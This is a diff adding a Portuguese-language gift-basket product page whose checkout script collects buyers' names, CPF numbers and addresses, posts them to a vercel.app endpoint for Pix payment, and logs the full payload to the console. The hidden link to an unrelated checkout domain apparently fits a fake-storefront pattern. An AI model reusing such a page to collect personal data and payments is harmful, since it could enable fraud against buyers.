+                                    <input class="qtdeOpcao" type="text" value="0" min="0" size="3" disabled="">
+                                    <button class="adicionarQtdeOpcao" aria-label="Adicionar"><i class="fa-solid fa-plus"></i></button>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="opcoes" data-id="118914">
+                            <div class="desc" style="width: 100%; flex-direction: row; align-items: center;">
+                                <span class="nome" style="">
+                                    <b>Caixa de Bombom</b>
+                                    <span class="detalheOpcao" style="padding-right:10px"></span>
+                                    <span class="preco"><span style="display:none;">5.00</span>+ R$ 5,00</span>
+                                </span>
+                                <div class="qtdeProdutoOpcao">
+                                    <button class="removerQtdeOpcao" aria-label="Remover"><i class="fa-solid fa-minus"></i></button>
+                                    <input class="qtdeOpcao" type="text" value="0" min="0" size="3" disabled="">
+                                    <button class="adicionarQtdeOpcao" aria-label="Adicionar"><i class="fa-solid fa-plus"></i></button>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="opcoes" data-id="118915">
+                            <div class="desc" style="width: 100%; flex-direction: row; align-items: center;">
+                                <span class="nome" style="">
+                                    <b>Ferrero Rocher</b>
+                                    <span class="detalheOpcao" style="padding-right:10px"></span>
+                                    <span class="preco"><span style="display:none;">3.00</span>+ R$ 3,00</span>
+                                </span>
+                                <div class="qtdeProdutoOpcao">
+                                    <button class="removerQtdeOpcao" aria-label="Remover"><i class="fa-solid fa-minus"></i></button>
+                                    <input class="qtdeOpcao" type="text" value="0" min="0" size="3" disabled="">
+                                    <button class="adicionarQtdeOpcao" aria-label="Adicionar"><i class="fa-solid fa-plus"></i></button>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="opcoes" data-id="118916">
+                            <div class="desc" style="width: 100%; flex-direction: row; align-items: center;">
+                                <span class="nome" style="">
+                                    <b>Ursinho de Pelúcia</b>
+                                    <span class="detalheOpcao" style="padding-right:10px"></span>
+                                    <span class="preco"><span style="display:none;">5.00</span>+ R$ 5,00</span>
+                                </span>
+                                <div class="qtdeProdutoOpcao">
+                                    <button class="removerQtdeOpcao" aria-label="Remover"><i class="fa-solid fa-minus"></i></button>
+                                    <input class="qtdeOpcao" type="text" value="0" min="0" size="3" disabled="">
+                                    <button class="adicionarQtdeOpcao" aria-label="Adicionar"><i class="fa-solid fa-plus"></i></button>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="opcoes" data-id="118917">
+                            <div class="desc" style="width: 100%; flex-direction: row; align-items: center;">
+                                <span class="nome" style="">
+                                    <b>Cartão</b>
+                                    <span class="detalheOpcao" style="padding-right:10px"></span>
+                                    <span class="preco"><span style="display:none;">3.00</span>+ R$ 3,00</span>
+                                </span>
+                                <div class="qtdeProdutoOpcao">
+                                    <button class="removerQtdeOpcao" aria-label="Remover"><i class="fa-solid fa-minus"></i></button>
+                                    <input class="qtdeOpcao" type="text" value="0" min="0" size="3" disabled="">
+                                    <button class="adicionarQtdeOpcao" aria-label="Adicionar"><i class="fa-solid fa-plus"></i></button>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="overlay"></div>
+                    <div class="imagem-ampliada">
+                        <img src="#" alt="">
+                        <button class="fechar"><i class="fa-solid fa-xmark"></i></button>
+                    </div>
+                    <label>Adicionar algum detalhe?</label>
+                    <input class="observacao" type="text" name="observacao" placeholder="Escreva o detalhe aqui (ex. mensagem no cartão) ..." maxlength="140">
+                    <em><span>0</span>/140</em>
+                </div>
+                <div class="info3">
+                    <input id="idProduto" type="hidden" name="idProduto" value="12223">
+                    <input type="hidden" id="productPrice" value="30.90">
+                    <div class="qtdeProduto" style="display: none;">
+                        <button class="removerQtde" aria-label="Remover"><i class="fa-solid fa-minus"></i></button>
+                        <input class="qtde" type="text" value="1" min="1" max="86" size="3" disabled="">
+                        <button class="adicionarQtde" aria-label="Adicionar"><i class="fa-solid fa-plus"></i></button>
+                    </div>
+                    <div id="precoProduto">R$ 30,90</div>
+                    <span class="precoProduto" style="display:none">30.90</span>
+                    <button class="btn adicionarProduto" onclick="finalizar()">FINALIZAR PEDIDO</button>
+                    <a href="https://checkout.resgatedex.shop/GIFTBASKET123" id="finalizarPedido" style="display: none;"></a>
+                </div>
+            </div>
+        </div>
+    </div>
+    <script type="text/javascript" src="js/jquery.js"></script>
+    <script type="text/javascript" src="js/deliveryProduto.js"></script>
+    <script src="js/all.js" data-auto-replace-svg="nest" defer type="text/javascript"></script>
+    <script type="text/javascript" src="js/jquery-mask.js" defer></script>
+
+    <script>
+        $(document).ready(function() {
+            if ($.fn.mask) {
+                console.log('jQuery mask loaded');
+            }
+        });
+
+        function isValidCPF(cpf) {
+            cpf = cpf.replace(/\D/g, '');
+            if (cpf.length !== 11 || /^(\d)\1+$/.test(cpf)) return false;
+            let sum = 0, remainder;
+            for (let i = 1; i <= 9; i++) sum += parseInt(cpf[i-1]) * (11 - i);
+            remainder = (sum * 10) % 11;
+            if (remainder === 10 || remainder === 11) remainder = 0;
+            if (remainder !== parseInt(cpf[9])) return false;
+            sum = 0;
+            for (let i = 1; i <= 10; i++) sum += parseInt(cpf[i-1]) * (12 - i);
+            remainder = (sum * 10) % 11;
+            if (remainder === 10 || remainder === 11) remainder = 0;
+            return remainder === parseInt(cpf[10]);
+        }
+
+        function finalizar() {
+            Swal.fire({
+                title: "Informe os dados de entrega",
+                html:
+                    '<input id="nomeInput" class="swal2-input" placeholder="Nome completo" aria-label="Nome completo" required>' +
+                    '<input id="emailInput" class="swal2-input" placeholder="E-mail" aria-label="E-mail" required>' +
+                    '<input id="phoneInput" class="swal2-input" placeholder="Telefone (ex. (11) 99999-9999)" aria-label="Telefone" required>' +
+                    '<input id="cpfInput" class="swal2-input" placeholder="CPF (ex. 123.456.789-00)" aria-label="CPF" required>' +
+                    '<input id="cepInput" class="swal2-input" placeholder="CEP (ex. 12345-678)" aria-label="CEP" required>' +
+                    '<input id="bairroInput" class="swal2-input" placeholder="Bairro" aria-label="Bairro" required>' +
+                    '<input id="ruaInput" class="swal2-input" placeholder="Rua" aria-label="Rua" required>' +
+                    '<input id="numeroInput" class="swal2-input" placeholder="Número" aria-label="Número" required>',
+                confirmButtonText: "Continuar",
+                confirmButtonColor: "#146914",
+                showCancelButton: true,
+                cancelButtonText: "Cancelar",
+                focusConfirm: false,
+                allowOutsideClick: false,
+                didOpen: () => {
+                    $('#cepInput').mask('00000-000');
+                    $('#cpfInput').mask('000.000.000-00');
+                    $('#phoneInput').mask('(00) 00000-0000');
+                },
+                preConfirm: () => {
+                    const nome = Swal.getPopup().querySelector('#nomeInput').value;
+                    const email = Swal.getPopup().querySelector('#emailInput').value;
+                    const phone = Swal.getPopup().querySelector('#phoneInput').value;
+                    const cpf = Swal.getPopup().querySelector('#cpfInput').value;
+                    const cep = Swal.getPopup().querySelector('#cepInput').value;
+                    const bairro = Swal.getPopup().querySelector('#bairroInput').value;
+                    const rua = Swal.getPopup().querySelector('#ruaInput').value;
+                    const numero = Swal.getPopup().querySelector('#numeroInput').value;
+
+                    if (!nome || !email || !phone || !cpf || !cep || !bairro || !rua || !numero) {
+                        Swal.showValidationMessage('Por favor, preencha todos os campos');
+                    } else if (!/^\d{5}-\d{3}$/.test(cep)) {
+                        Swal.showValidationMessage('CEP inválido. Use o formato 12345-678');
+                    } else if (!isValidCPF(cpf)) {
+                        Swal.showValidationMessage('CPF inválido');
+                    } else if (!/\S+@\S+\.\S+/.test(email)) {
+                        Swal.showValidationMessage('E-mail inválido');
+                    } else if (!/^\(\d{2}\)\s\d{5}-\d{4}$/.test(phone)) {
+                        Swal.showValidationMessage('Telefone inválido. Use o formato (11) 99999-9999');
+                    }
+                    return { nome, email, phone, cpf, cep, bairro, rua, numero };
+                }
+            }).then((result) => {
+                if (result.isConfirmed) {
+                    const { nome, email, phone, cpf, cep, bairro, rua, numero } = result.value;
+                    Swal.fire({
+                        title: "Deseja que entregamos a cesta agora?",
+                        showDenyButton: true,
+                        showCancelButton: false,
+                        allowOutsideClick: false,
+                        icon: 'question',
+                        confirmButtonText: "Sim, por favor!",
+                        confirmButtonColor: "#146914",
+                        denyButtonText: "Não, quero agendar a entrega!",
+                        focusConfirm: true
+                    }).then((deliveryResult) => {
+                        let deliveryTime = null;
+                        if (deliveryResult.isConfirmed) {
+                            proceedToPayment(nome, email, phone, cpf, cep, bairro, rua, numero, null);
+                        } else if (deliveryResult.isDenied) {
+                            Swal.fire({
+                                title: "Selecione o dia e a hora, por gentileza!",
+                                text: 'Agende a entrega da sua cesta e receba na hora combinada.',
+                                confirmButtonText: "Agendar pedido!",
+                                confirmButtonColor: "#146914",
+                                showCancelButton: false,
+                                allowOutsideClick: false,
+                                input: "datetime-local",
+                                inputAttributes: {
+                                    min: new Date().toISOString().slice(0, 16),
+                                    max: "2025-12-31T18:00"
+                                },
+                                preConfirm: (selectedTime) => {
+                                    if (!selectedTime) {
+                                        Swal.showValidationMessage('Por favor, selecione uma data e hora');
+                                    }
+                                    return selectedTime;
+                                }
+                            }).then((scheduleResult) => {
+                                if (scheduleResult.isConfirmed) {
+                                    deliveryTime = scheduleResult.value;
+                                    proceedToPayment(nome, email, phone, cpf, cep, bairro, rua, numero, deliveryTime);
+                                }
+                            });
+                        }
+                    });
+                }
+            });
+        }
+
+        function proceedToPayment(nome, email, phone, cpf, cep, bairro, rua, numero, deliveryTime) {
+            const price = parseFloat($('#detalhesProduto .info3 .precoProduto').text());
+            if (isNaN(price) || price <= 0) {
+                Swal.fire({
+                    title: 'Erro',
+                    text: 'Preço inválido. Verifique o valor do produto.',
+                    icon: 'error',
+                    confirmButtonText: 'OK',
+                    confirmButtonColor: '#146914'
+                });
+                return;
+            }
+
+            const quantity = parseInt($('.qtde').val());
+            const amount = Number((price * quantity).toFixed(2));
+            const clientIdentifier = `order_${$('#idProduto').val()}_${Date.now()}`;
+            const cpfFormatted = cpf.replace(/\D/g, '');
+            const dueDate = new Date();
+            dueDate.setDate(dueDate.getDate() + 1);
+            const formattedDueDate = dueDate.toISOString().split('T')[0];
+
+            const observacao = DOMPurify.sanitize($('.observacao').val());
+
+            const payload = {
+                identifier: clientIdentifier,
+                amount: amount,
+                client: {
+                    name: nome,
+                    email: email,
+                    phone: phone,
+                    document: cpfFormatted
+                },
+                products: [
+                    {
+                        id: $('#idProduto').val(),
+                        name: $('h3', '.descricao').text(),
+                        quantity: quantity,
+                        price: Number(price.toFixed(2))
+                    },
+                    ...$('#add-ons .opcoes').filter(function() {
+                        return parseInt($(this).find('.qtdeOpcao').val()) > 0;
+                    }).map(function() {
+                        return {
+                            id: $(this).data('id'),
+                            name: $(this).find('.nome b').text(),
+                            quantity: parseInt($(this).find('.qtdeOpcao').val()),
+                            price: parseFloat($(this).find('.preco span').text())
+                        };
+                    }).get()
+                ],
+                dueDate: formattedDueDate,
+                metadata: {
+                    orderId: clientIdentifier,
+                    deliveryTime: deliveryTime || 'immediate',
+                    address: `${rua}, ${numero}, ${bairro}, ${cep}`,
+                    observacao: observacao || ''
+                },
+                callbackUrl: 'https://floriculturanacional.vercel.app/api/payments'
+            };
+
+            console.log('Sending payload:', JSON.stringify(payload, null, 2));
+            Swal.showLoading();
+            $.ajax({
+                url: 'https://floriculturanacional.vercel.app/api/payments',
+                type: 'POST',
+                contentType: 'application/json; charset=utf-8',
+                data: JSON.stringify(payload),
+                dataType: 'json',
+                processData: false,
+                cache: false,
+                success: function(response) {
+                    Swal.hideLoading();
+                    console.log('Payment Success Response:', response);
+                    if (response && response.pix && response.pix.code) {
+                        const qrCodeContainerId = 'qrcode-' + Date.now();
+                        Swal.fire({
+                            title: 'Pagamento Pix iniciado!',
+                            icon: 'success',
+                            confirmButtonText: 'Fechar',
+                            confirmButtonColor: '#146914',
+                            html: `
+                                <p>Escaneie o QR Code ou copie o código Pix para pagar.</p>
+                                <div id="${qrCodeContainerId}" style="margin: 20px auto; width: 200px; height: 200px;"></div>
+                                <p><strong>Código Pix:</strong></p>
+                                <p style="word-break: break-all; max-width: 300px; margin: 10px auto;">${response.pix.code}</p>
+                                <button id="copyPixCode" style="background-color: #146914; color: white; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer;">Copiar Código Pix</button>
+                            `,
+                            didOpen: () => {
+                                new QRCode(document.getElementById(qrCodeContainerId), {
+                                    text: response.pix.code,
+                                    width: 200,
+                                    height: 200,
+                                    colorDark: '#000000',
+                                    colorLight: '#ffffff',
+                                    correctLevel: QRCode.CorrectLevel.H
+                                });
+
+                                document.getElementById('copyPixCode').addEventListener('click', () => {
+                                    navigator.clipboard.writeText(response.pix.code).then(() => {
+                                        Swal.fire({
+                                            title: 'Código Copiado!',
+                                            text: 'O código Pix foi copiado para a área de transferência.',
+                                            icon: 'success',
+                                            confirmButtonText: 'OK',
+                                            confirmButtonColor: '#146914',
+                                            timer: 2000,
+                                            timerProgressBar: true
+                                        });
+                                    }).catch(err => {
+                                        console.error('Failed to copy Pix code:', err);
+                                        Swal.fire({
+                                            title: 'Erro',
+                                            text: 'Não foi possível copiar o código Pix. Tente novamente.',
+                                            icon: 'error',
+                                            confirmButtonText: 'OK',
+                                            confirmButtonColor: '#146914'
+                                        });
+                                    });
+                                });
+                            }
+                        });
+                    } else {
+                        Swal.fire({
+                            title: 'Erro',
+                            text: 'Resposta inválida do servidor. Tente novamente ou contate o suporte.',
+                            icon: 'error',
+                            confirmButtonText: 'OK',
+                            confirmButtonColor: '#146914'
+                        });
+                    }
+                },
+                error: function(jqXHR, textStatus, errorThrown) {
+                    Swal.hideLoading();
+                    console.error('Payment Error:', {
+                        status: jqXHR.status,
+                        statusText: textStatus,
+                        responseJSON: jqXHR.responseJSON,
+                        responseText: jqXHR.responseText,
+                        errorThrown: errorThrown
+                    });
+                    let errorMessage = 'Não conseguimos processar o pagamento. Tente novamente.';
+                    if (jqXHR.responseJSON && jqXHR.responseJSON.message) {
+                        errorMessage = jqXHR.responseJSON.message;
+                        if (jqXHR.responseJSON.details) {
+                            errorMessage += ` Detalhes: ${JSON.stringify(jqXHR.responseJSON.details)}`;
+                        }
+                    } else if (jqXHR.status === 400) {
+                        errorMessage = 'Dados inválidos. Verifique os campos e tente novamente.';
+                    } else if (jqXHR.status === 401) {
+                        errorMessage = 'Autenticação inválida. Contate o suporte da VenuxPay.';
+                    } else if (jqXHR.status === 403) {
+                        errorMessage = 'Acesso negado. Contate o suporte da VenuxPay.';
+                    } else if (jqXHR.status === 404) {
+                        errorMessage = 'Endpoint da API de pagamento não encontrado. Contate o suporte da VenuxPay.';
+                    } else if (jqXHR.status === 0) {
+                        errorMessage = 'Erro de conexão. Verifique se o servidor proxy está rodando em http://localhost:3000.';
+                    }
+                    Swal.fire({
+                        title: 'Erro ao iniciar pagamento',
+                        text: errorMessage,
+                        icon: 'error',
+                        confirmButtonText: 'OK',
+                        confirmButtonColor: '#146914'
+                    });
+                }
+            });
+        }
+    </script>
+</body>
+</html>
